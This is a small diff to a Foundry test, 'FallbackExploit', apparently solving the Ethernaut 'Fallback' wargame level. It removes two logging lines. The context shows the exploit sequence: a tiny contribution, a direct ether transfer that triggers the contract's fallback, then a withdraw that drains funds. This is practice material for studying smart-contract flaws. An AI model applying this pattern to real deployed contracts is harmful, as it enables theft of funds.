@@ -20,7 +20,6 @@ contract FallbackExploit is Test
     vm.deal(userAddr1, 1 ether);
     vm.prank(userAddr1);
     fb.contribute{value: 0.0001 ether}();
-    console.log(fb.getContribution());
 
     vm.prank(userAddr1);
     (bool success, ) = address(fb).call{value: 0.0001 ether}("");
@@ -28,7 +27,6 @@ contract FallbackExploit is Test
 
     vm.prank(userAddr1);
     fb.withdraw();
-    console.log("Exploit works!");
   }
 }
 
